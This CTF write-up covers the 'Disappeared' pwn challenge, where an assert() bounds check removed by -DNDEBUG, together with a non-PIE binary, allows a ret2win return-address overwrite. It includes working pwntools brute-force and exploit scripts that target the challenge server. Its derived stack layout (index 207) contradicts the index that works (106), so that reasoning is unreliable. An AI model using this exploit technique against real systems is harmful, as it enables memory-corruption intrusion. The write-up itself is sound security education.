+++
title = " Disappeared (Daily Alpacahack) Writeup"
date = 2026-02-18T06:00:00Z
draft = false
tags = ["ctf", "pwn", "binary exploitation", "ret2win"]
categories = ["CTF Writeups"]
+++


# Disappeared — Daily Alpacahack Writeup

**Category:** Pwn · **Difficulty:** Medium ·  

----------

## Overview

We're given source code and a netcat address. The code looks safe at first glance — there's a bounds check on the array index before any write. The trick is in the compile command:

```
gcc -DNDEBUG -o chal main.c -no-pie

```

Two flags matter: `-DNDEBUG` and `-no-pie`.

----------

## The Vulnerability

### `-DNDEBUG` silently deletes `assert()`

The C standard specifies that when `NDEBUG` is defined, every `assert()` call is **completely removed by the preprocessor** — not weakened, not skipped at runtime. Deleted.

```c
// Source code says:
assert(pos < 100);

// With -DNDEBUG, the preprocessor turns this into:
// (nothing)

```

The challenge is literally called "Disappeared" because the bounds check disappears. `assert()` is a debugging tool, never a security primitive — the moment a production build defines `NDEBUG`, all your asserts vanish.

With the check gone, `scanf("%u", &num[pos])` will write a user-controlled `unsigned int` to **any index** relative to `num[0]` on the stack. One arbitrary relative write.

### `-no-pie` means fixed addresses

No PIE means the binary loads at a fixed base every time. `win()` always lives at the same address — no ASLR to defeat, no leak needed.

```
$ objdump -d chal | grep '<win>'
00000000004011b6 <win>:

```

`win()` is at `0x4011b6`. Since the upper 32 bits are `0x00000000`, we only need a single 32-bit write to redirect execution.

----------

## Stack Layout

Breaking at `safe()` in GDB reveals the frame:

```bash
pwndbg> b safe
pwndbg> run

RBP  0x7fffffffd9d0
RSP  0x7fffffffd820

# From disassembly:
0x40120c <safe+50>  lea rax, [rbp - 0x1a4]   # &pos
0x4011f2 <safe+24>  mov qword ptr [rbp - 8], rax  # canary

```

Reconstructed layout:

Address

Contents

Notes

`rbp + 0x008`

return address

← target

`rbp + 0x000`

saved RBP

`rbp - 0x008`

stack canary

⚠ must not corrupt

`rbp - 0x1a4`

`pos`

first scanf reads here

`rbp - 0x1a8`

`num[99]`

top of array

`rbp - 0x334`

`num[0]`

base of array

### Calculating the target index

```
pos    = rbp − 0x1a4 = rbp − 420
num[0] = pos − (100 × 4) = rbp − 420 − 400 = rbp − 0x334
ret    = rbp + 8

distance = (rbp + 8) − (rbp − 0x334) = 0x33c = 828 bytes
index    = 828 ÷ 4 = 207  (local)

```

> **Note:** The local calculation gives index 207, but the remote server has different environment variables which shift the stack slightly. The correct index needs to be confirmed against the remote.

----------

## Canary — Not a Problem

The binary has a stack canary, but this doesn't matter here. A canary defends against _sequential_ overwrites (classic buffer overflows). Our write is a **single targeted index write** — we jump straight to the return address slot without touching anything between `num[0]` and it. The canary is untouched.

----------

## Exploitation

### Step 1 — Brute the remote offset

Index 207 didn't pop a shell locally (remote stack differs). A quick brute-forcer over the plausible range finds the right slot:

```python
#!/usr/bin/env python3
from pwn import *

WIN = 0x4011b6

for idx in list(range(100, 116)) + list(range(200, 220)):
    r = remote("34.170.146.252", 40839, timeout=5)
    r.recvuntil(b"pos > ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"val > ")
    r.sendline(str(WIN).encode())
    r.sendline(b"id")
    resp = r.recvall(timeout=2)
    if b"uid=" in resp:
        print(f"[+] SHELL at index {idx}!")
        break
    r.close()

```

Output:

```
[-] idx=100: b''
[-] idx=101: b''
[-] idx=102: b'*** stack smashing detected ***: terminated\n'
[-] idx=103: b'*** stack smashing detected ***: terminated\n'
[-] idx=104: b''
[-] idx=105: b''
[+] === SHELL at index 106! ===
uid=999(pwn) gid=999(pwn) groups=999(pwn)

```

Indices 102 and 103 hit the canary (confirming it exists and exactly where it is). Everything maps cleanly:

Index

What we hit

Result

102

canary low 32 bits

stack smashing detected

103

canary high 32 bits

stack smashing detected

104

saved RBP low

crash

105

saved RBP high

crash

**106**

**return address low**

**shell ✓**

### Step 2 — Clean final exploit

```python
#!/usr/bin/env python3
from pwn import *

WIN = 0x4011b6   # fixed — no PIE

r = remote("34.170.146.252", 40839)

r.recvuntil(b"pos > ")
r.sendline(b"106")             # return address slot

r.recvuntil(b"val > ")
r.sendline(str(WIN).encode())  # 4198838 decimal

r.interactive()

```

`win()` lives at `0x004011b6` — the upper 32 bits are already `0x00000000` on the stack, so one write is all it takes.

----------

## Summary

The vulnerability is a real-world footgun: `assert()` is stripped by `-DNDEBUG` in production builds, silently removing the only bounds check. Combined with no PIE and a single clean write to the return address, this becomes a one-shot ret2win.

The lesson: **never use `assert()` for input validation**. Use explicit `if` checks that survive in all build configurations.